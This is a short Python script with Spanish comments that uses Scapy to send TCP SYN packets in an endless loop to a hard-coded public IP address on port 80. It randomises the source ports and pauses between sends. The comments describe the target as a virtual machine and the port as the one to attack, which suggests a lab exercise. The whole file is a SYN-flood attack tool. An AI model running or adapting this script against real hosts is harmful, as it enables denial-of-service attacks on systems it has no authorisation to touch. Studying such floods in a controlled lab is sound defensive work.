from scapy.all import IP, TCP, send
import time
import random

target_ip = "135.237.157.135" #IP de la maquina virtual
target_port =80 #Puerto a atacar

print(f"Enviando peticiones SYN a {target_ip}:{target_port}") #Mensaje de inicio

count = 0
while True: #Bucle infinito para enviar paquetes
    count += 1

    packet = IP(dst=target_ip) / TCP(
        sport=random.randint(1024, 65535), #Puerto de origen aleatorio
        dport=target_port, #Puerto de destino
        flags="S" #Bandera SYN
    )

    send(packet, verbose=0) #Envio del paquete
    print(f"Paquete {count} enviado")
    time.sleep(random.uniform(0.5, 2.0)) #Pausa aleatoria entre envíos
